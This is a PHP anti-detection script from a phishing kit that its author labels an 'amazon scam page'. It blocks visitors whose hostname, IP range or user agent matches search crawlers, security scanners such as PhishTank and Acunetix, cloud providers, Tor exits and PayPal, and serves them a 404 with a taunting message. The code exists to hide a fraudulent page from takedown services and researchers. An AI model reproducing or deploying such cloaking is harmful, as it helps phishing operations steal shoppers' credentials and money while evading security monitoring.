<?php

/**
 * @link              https://www.z0n51.com/
 * @since             04/11/2019
 * @package           amazon scam page
 * @facebook          https://www.facebook.com/z0n51
 * @whatsapp          +212601728021
 * @icq               @z0n51
 * @telegram          @z0n51
 *
 * Project Name:      amazon scam page
 * Author:            z0n51
 * Author URI:        https://www.facebook.com/z0n51
 */

$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$blocked_words = array("Googlebot","Baiduspider","ia_archiver","R6_FeedFetcher","NetcraftSurveyAgent","Sogou web spider","bingbot","Yahoo! Slurp","facebookexternalhit","PrintfulBot","msnbot","Twitterbot","UnwindFetchor","urlresolver","Butterfly","TweetmemeBot","PaperLiBot","MJ12bot","AhrefsBot","Exabot","Ezooms","YandexBot","SearchmetricsBot","picsearch","TweetedTimes Bot","QuerySeekerSpider","ShowyouBot","woriobot","merlinkbot","BazQuxBot","Kraken","SISTRIX Crawler","R6_CommentReader","magpie-crawler","GrapeshotCrawler","PercolateCrawler","MaxPointCrawler","NetSeer crawler","grokkit-crawler","SMXCrawler","PulseCrawler","Y!J-BRW","80legs.com/webcrawler","Mediapartners-Google","Spinn3r","InAGist","Python-urllib","NING","TencentTraveler","Feedfetcher-Google","mon.itor.us","spbot","Feedly","bot","curl","spider","crawler","above","google","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit","paypal");
foreach($blocked_words as $word) {
    if (substr_count($hostname, $word) > 0) {
        header("HTTP/1.0 404 Not Found");
        echo "HELLOOOOO BITCHES | I FUCKING LOVE YOU HAHAHAHAHAHAHA <3 |  TRY BYPASS ME NEXT TIME BB <3";
    }  
}

$bannedIP = array("^81.161.59.*","^66.135.200.*","^66.102.*.*","^38.100.*.*","^107.170.*.*","^149.20.*.*","^38.105.*.*","^74.125.*.*","^66.150.14.*","^54.176.*.*","^184.173.*.*","^66.249.*.*","^128.242.*.*","^72.14.192.*","^208.65.144.*","^209.85.128.*","^216.239.32.*","^207.126.144.*","^173.194.*.*","^64.233.160.*","^64.18.*.*","^194.52.68.*","^194.72.238.*","^62.116.207.*","^212.50.193.*","^69.65.*.*","^50.7.*.*","^131.212.*.*","^46.116.*.* ","^62.90.*.*","^89.138.*.*","^82.166.*.*","^85.64.*.*","^85.250.*.*","^93.172.*.*","^109.186.*.*","^194.90.*.*","^212.29.192.*","^212.29.224.*","^212.143.*.*","^212.150.*.*","^212.235.*.*","^217.132.*.*","^50.97.*.*","^209.85.*.*","^66.205.64.*","^204.14.48.*","^64.27.2.*","^67.15.*.*","^202.108.252.*","^193.47.80.*","^64.62.136.*","^66.221.*.*","^64.62.175.*","^198.54.*.*","^192.115.134.*","^216.252.167.*","^193.253.199.*","^69.61.12.*","^64.37.103.*","^38.144.36.*","^64.124.14.*","^206.28.72.*","^209.73.228.*","^158.108.*.*","^168.188.*.*","^66.207.120.*","^167.24.*.*","^192.118.48.*","^67.209.128.*","^12.148.209.*","^12.148.196.*","^193.220.178.*","68.65.53.71","^198.25.*.*","^64.106.213.*","^91.103.66.*","^208.91.115.*","^199.30.228.*");

if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)) {
    header('HTTP/1.0 404 Not Found');
    exit();
} else {
    foreach($bannedIP as $ip) {
        if( preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR']) ) {
            header('HTTP/1.0 404 Not Found');
            echo "HELLOOOOO BITCHES | I FUCKING LOVE YOU HAHAHAHAHAHAHA <3 |  TRY BYPASS ME NEXT TIME BB <3";
        }
    }
}

if (strpos($_SERVER['HTTP_USER_AGENT'], 'google') || strpos($_SERVER['HTTP_USER_AGENT'], 'msnbot') || strpos($_SERVER['HTTP_USER_AGENT'], 'Yahoo! Slurp') || strpos($_SERVER['HTTP_USER_AGENT'], 'YahooSeeker') || strpos($_SERVER['HTTP_USER_AGENT'], 'Googlebot') || strpos($_SERVER['HTTP_USER_AGENT'], 'bingbot') || strpos($_SERVER['HTTP_USER_AGENT'], 'crawler') || strpos($_SERVER['HTTP_USER_AGENT'], 'PycURL') || strpos($_SERVER['HTTP_USER_AGENT'], 'facebookexternalhit') || strpos($_SERVER['HTTP_USER_AGENT'], 'Yandex') || strpos($_SERVER['HTTP_USER_AGENT'], 'Baiduspider') || strpos($_SERVER['HTTP_USER_AGENT'], 'Acunetix') || strpos($_SERVER['HTTP_USER_AGENT'], 'crossdomain') || strpos($_SERVER['HTTP_USER_AGENT'], 'wwwroot') || strpos($_SERVER['HTTP_USER_AGENT'], 'Exabot') || strpos($_SERVER['HTTP_USER_AGENT'], 'NimbleCrawler') || strpos($_SERVER['HTTP_USER_AGENT'], 'Octopus') || strpos($_SERVER['HTTP_USER_AGENT'], 'OutfoxBot') || strpos($_SERVER['HTTP_USER_AGENT'], 'ProPowerBot') !== false ) {
    header('HTTP/1.0 404 Not Found');
    exit;
}

?>